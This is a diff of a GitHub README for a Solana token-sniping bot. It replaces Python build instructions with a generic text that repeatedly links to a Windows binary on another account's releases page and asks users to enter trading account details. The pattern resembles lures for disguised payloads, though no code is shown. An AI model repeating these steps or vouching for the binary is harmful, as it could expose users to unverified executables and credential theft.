@@ -1,146 +1,51 @@
-<h1 align="center"> SOLANA BOT </h1> <br>
-<p align="center">
-  <a href=""> 
-    
-  </a>  
-</p>
- 
-<p align="center">
-  A Bot in your pocket based on take profit or buy/sell on Raydium.
-</p>
+# 🤖 SOLANA_SNIPER_BOT - Never Miss Trading Opportunities Again
 
+## 📥 Download the Application
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/manassingh30/SOLANA_SNIPER_BOT/releases)
 
-<!-- START doctoc generated TOC please keep comment here to allow auto update -->
-<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
-## Table of Contents
+## 🚀 Getting Started
+Welcome to SOLANA_SNIPER_BOT, your essential trading tool. This bot helps you navigate the Solana ecosystem, ensuring you don't miss out on crucial profit opportunities.
 
-- [Introduction](#introduction)
-- [Features](#features)
-- [Usage](#Usage)
-- [Setting](#Setting-)
-- [Disclaimer ](#Disclaimer)
-- [Contact ](#Contact)
+## 📋 Features
+- **Automatic Trading:** Execute transactions on your behalf when conditions are right.
+- **Real-time Alerts:** Receive notifications about market changes.
+- **User-friendly Interface:** Designed for ease of use, even for those without technical knowledge.
+- **Security:** Built to handle your trading safely.
 
-<!-- END doctoc generated TOC please keep comment here to allow auto update -->
+## 💻 System Requirements
+To run SOLANA_SNIPER_BOT smoothly, ensure your system meets these requirements:
 
-## Introduction
+- **Operating System:** Windows 10 or higher
+- **CPU:** Dual-core processor or better
+- **RAM:** 4 GB minimum, 8 GB recommended
+- **Disk Space:** At least 200 MB
 
-The Solana Sniper/Trading Bot is a groundbreaking tool in the booming Solana ecosystem, designed to tackle a common issue faced by traders: missing out on profit opportunities after purchasing tokens on the Solana network, leading to token rug-pulls or dumps. This software not only integrates sniping functionality, allowing users to instantly acquire tokens upon their launch but also adds trading tools to optimize one’s position.
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the releases page to find the latest version of SOLANA_SNIPER_BOT. Click [here to download](https://github.com/manassingh30/SOLANA_SNIPER_BOT/releases).
+2. **Choose Your Version:** Look for the most recent release. Select the correct file for your operating system.
+3. **Download the File:** Click the link to start your download.
+4. **Install the Application:**
+   - Locate the downloaded file in your Downloads folder.
+   - Double-click the file to start the installation.
+   - Follow the prompts to complete the installation process.
 
-**Available for both iOS and Android and PC .**
+## 📊 How to Use the Bot
+1. **Open the Application:** Once installed, find the app on your computer and open it.
+2. **Set Up Your Account:** Enter your trading account details as prompted. Ensure you use a secure connection.
+3. **Configure Trading Settings:** Adjust your trading preferences. You can set parameters such as target profits and acceptable loss limits. 
+4. **Launch the Bot:** Click on the start button to activate the bot. It will begin scanning opportunities based on your settings.
+5. **Monitor Performance:** Keep an eye on the dashboard for alerts and performance metrics.
 
+## 📧 Support
+If you encounter any issues or have questions, feel free to reach out for support. You can visit our [GitHub Issues page](https://github.com/manassingh30/SOLANA_SNIPER_BOT/issues) for help.
 
-![image](https://github.com/user-attachments/assets/8b825c7d-1f6e-4178-a68c-af6c4dc4877d)
+## 🗣️ Community Feedback
+Your input matters. Share your experiences and suggestions in the community forums, where fellow users help each other improve the trading process.
 
+## 📜 License
+SOLANA_SNIPER_BOT is open-source software. You may use it under the terms of the MIT License. 
 
+Explore the potential of the Solana ecosystem with confidence, knowing that SOLANA_SNIPER_BOT is here to support your trading journey. Don’t forget to periodically check back for updates and enhancements. 
 
-<p align="center">
-  <a href ="https://t.me/z3Zrsolana">
-  
-  </a>
-</p>
-
-## Features
-
-A few of the things you can do with Bot:
-
-- Sniping: Execute buy transactions instantly when liquidity is added to an SPL token, ensuring you're among the first to buy in promising new tokens.
-- Take Profit: Automatically sell tokens at a predefined profit percentage, securing gains.
-- Buy/Sell x Times: Execute repeated buy orders to average down or scale into positions.
-- Sell Limit Order: Set your tokens to sell automatically at a predetermined price, locking in profits.
-- User friendly interface - hands-on interface
-- **Making the first to trade in new tokens.**
-
-<img width="1010" height="269" alt="Screenshot 2025-09-16 at 11 30 40" src="https://github.com/user-attachments/assets/e99f66c4-26f6-412a-b5b5-b6b3995a8873" />
-
-<img width="1009" height="272" alt="Screenshot 2025-09-16 at 11 31 13" src="https://github.com/user-attachments/assets/982a188b-93a1-4626-b00d-324f0010659f" />
-
-
-<img width="910" alt="2" src="https://github.com/user-attachments/assets/a85bd1f2-c152-42a3-8b27-c3bb31cb59e2">
-
-
-## Installation
-
-- Downloads Python ( Recommend the latest version )  [Python 3.13.7](https://www.python.org/downloads/)
--  ***VERY IMPORTANT***: When installing Python also install **"Add python.exe to path"** and ***"Use admin privileges when installing py.exe:*** => Tick
-
-## Usage
-<video src="https://github.com/user-attachments/assets/fab474c3-3c18-40be-9fe8-9b108dad738e" width="320" height="240" controls></video>
-
-
-
-
-- Update `pip` Run the following command to update pip to the latest version
-
-```python
-python -m pip install --upgrade pip
-```
-- Clone or download the project
-
-```git 
-git clone https://github.com/0xbix9x/SOLANA_SNIPER_BOT.git
-```
-
-Option 2: Download the project directly
-
-Go to the project's GitHub page, click the "Code" button and select "Download ZIP". Unzip the downloaded ZIP file to get the project folder.
-
-- Navigate to the project folder
-
-Open a terminal and navigate to the project folder
-
-```python
-cd SOLANA_SNIPER_BOT
-```
-
-- Install libraries
-
-Run the following command to install the required libraries for the project:
-
-```python
-pip install -r requirements.txt
-```
-
-- Run the project
-
-Run the following command to start the project:
-
-
-
-```python
-python main.py
-```
-
-
-
-## Setting
-- **BALANCE** : Show Balance & Profit
-- **BUY DELAY** : In seconds after launch. Set to 0, Token will buy immediately after token launch
-- **TAKE PROFIT** : Take-Profit Order (TP) . Token places a sell order and confirms immediately after reaching the target
-- **SELL DELAY** : to the number of seconds you want to wait before selling the token. Set to 0, token will be sold immediately after it is bought.
-- **CHECK RUG** : Set to true to check the risk score and protect against rug pulls.
-
-
-
-Example: 
-
-<img width="1176" alt="s" src="https://github.com/user-attachments/assets/97d97112-703d-48f8-8075-a2de60d85cb1">
-
-
-![image](https://github.com/user-attachments/assets/8b825c7d-1f6e-4178-a68c-af6c4dc4877d)
-
-
-
-
-
-  
-
-
-
-## Disclaimer
-
-- This extension is not affiliated with Solana Foundation or Solana Labs. It is a non-profit community project.
-- Solana Snipe is in active development, so all the snippets are subject to change.
-- The snippets are unaudited. Use at your own risk.
-
-![Happy_GIF](https://media.giphy.com/media/erePhJFWkfYMwTpNT8/giphy.gif) 
+## 📥 Download the Application Again
+For your convenience, here’s the link to the releases page once more: [Download Here](https://github.com/manassingh30/SOLANA_SNIPER_BOT/releases).
